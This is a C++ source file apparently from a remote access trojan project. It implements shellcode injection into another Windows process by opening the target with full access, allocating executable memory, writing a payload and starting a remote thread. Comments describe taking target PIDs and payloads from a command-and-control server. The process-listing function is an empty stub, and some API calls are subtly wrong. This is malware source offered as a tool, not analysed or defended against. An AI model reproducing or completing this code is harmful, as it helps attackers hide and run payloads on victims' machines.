// Patrick Sacchet
// Version 1.0
// RAT-Exe-Injection.cpp : This file contains functionality for injecting into a target process

#include "RAT-Exe-Injection.h"

// parse through all processes and send them back to our C2
INT parseProcesses(__inout char*** procs, __inout char** procPIDs, __inout INT* numProcs)
{
	INT status = ERROR_SUCCESS;










cleanup:
	return status;
}







// take PID from C2 to inject into 
INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
{
	INT status = ERROR_SUCCESS;
	CHAR messageBuffer [MAX_BUFFER_SIZE];
	LPVOID baseAddress = NULL;
	HANDLE hProcess, hThread;
	UINT64 numBytesWritten = 0;
	LPDWORD threadID = { };


	sprintf_s(messageBuffer, "RAT-Exe-Inject::inject - Injecting into process %d\n", PID);
	OutputDebugStringA(messageBuffer);

	//hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, PID);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL)
	{
		OutputDebugStringA("RAT-Exe-Inject::inject - Failed to open handle to target process!\n");
		status = GetLastError();
		goto cleanup;
	}

	// allocate memory in target process
	baseAddress = VirtualAllocEx(hProcess, NULL, payloadSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (baseAddress == NULL)
	{
		sprintf_s(messageBuffer, "RAT-Exe-Inject::inject - Failed to allocate memory in target process! Error %d\n", GetLastError());
		OutputDebugStringA(messageBuffer);
		status = ERROR_NOT_ENOUGH_MEMORY;
		goto cleanup;
	}

	status = WriteProcessMemory(hProcess, baseAddress, payloadBytes, payloadSize, &numBytesWritten);
	if (status == 0)
	{
		OutputDebugStringA("RAT-Exe-Inject::inject - Failed to write payload into target process!\n");
		status = GetLastError();
		goto cleanup;
	}

	hThread = CreateRemoteThreadEx(&hProcess, NULL, payloadSize, (LPTHREAD_START_ROUTINE)baseAddress, NULL, NULL, NULL, threadID);
	if (hThread == NULL)
	{
		OutputDebugStringA("RAT-Exe-Inject::inject - Failed to start remote thread!\n");
		status = GetLastError();
		goto cleanup;
	}

	WaitForSingleObject(hThread, INFINITE);


cleanup:
	return status;
}


// read in the bytes for our payload 
	// would be a bit different in implementation as we:
		// scan for processes we can inject into 
		// send them to C2
		// get back the PID it wants to inject into; followed by payload
		// open that process and inject bytes directly; dont need to read from disk
INT readPayload(__in char* filePath, __inout UINT64* payloadSize, __inout char** payloadBytes)
{
	INT status = ERROR_SUCCESS;
	CHAR messageBuffer[MAX_BUFFER_SIZE], *fileContents = NULL;
	DWORD dwBytesRead = 0;
	HANDLE hFile;
	LARGE_INTEGER fileSize;

	hFile = CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA("RAT-Exe-Inject::readPayload - Failed to obtain file handle!\n");
		goto cleanup;
	}

	if (!GetFileSizeEx(hFile, &fileSize))
	{
		sprintf_s(messageBuffer, "RAT-Exe-Injection::readPayload - Failure from GetFileSizeEx %d\n", GetLastError());
		OutputDebugStringA(messageBuffer);
		status = GetLastError();
		goto cleanup;
	}

	fileContents = (char*)malloc(fileSize.QuadPart * sizeof(char));
	if (fileContents == NULL)
	{
		OutputDebugStringA("RAT-Exe-Injection::readPayload - Failure from malloc (NOT ENOUGH MEMORY)");
		status = ERROR_OUTOFMEMORY;
		goto cleanup;
	}

	*payloadSize = fileSize.QuadPart;

	if (!ReadFile(hFile, fileContents, fileSize.QuadPart, &dwBytesRead, NULL))
	{
		sprintf_s(messageBuffer, "RAT-Exe-Injection::readPayload - Failure from ReadFile %d\n", GetLastError());
		OutputDebugStringA(messageBuffer);
		status = GetLastError();
		goto cleanup;
	}

	*payloadBytes = fileContents;

	if (!CloseHandle(hFile))
	{
		printf_s(messageBuffer, "RAT-Exe-Injection::readPayload - Failure from CloseHandle %d\n", GetLastError());
		OutputDebugStringA(messageBuffer);
		status = GetLastError();
		goto cleanup;
	}



cleanup:
	return status;
}